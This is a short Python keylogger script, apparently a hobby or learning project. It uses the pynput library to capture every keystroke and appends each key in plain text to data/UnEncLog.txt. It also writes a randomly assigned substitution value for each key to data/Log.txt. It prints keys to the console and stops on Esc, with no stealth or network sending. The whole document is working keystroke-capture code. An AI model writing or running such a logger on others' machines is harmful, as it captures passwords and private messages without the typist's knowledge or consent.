from pynput import keyboard
import random


arr = {}

def hashing(key):
    if (key in arr):
        print("in in alr")
        return arr[key]
    num = random.random()
    arr[key]=hash(num)
    print(f'New hash for {key}: {arr[key]}')
    return arr[key]

def on_press(key):
    try:
        print('Key' +f'{key.char}'+' has been pressed')
        newKey = hashing(f'{key.char}')
        print(arr)
        with open("data/UnEncLog.txt", "a") as uncLog_file:
            uncLog_file.write(f'{key}/')
        with open("data/Log.txt","a") as log_file:
            log_file.write(f'{newKey}/')
    except AttributeError:
        print(f'Special key {key} pressed')
        with open("data/UnEncLog.txt", "a") as uncLog_file:
            uncLog_file.write(f'{key}/')
        with open("data/Log.txt", "a") as log_file:
            log_file.write(f'[{key}]/')
    
def on_release(key):
    if key == keyboard.Key.esc:
        return False
        
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
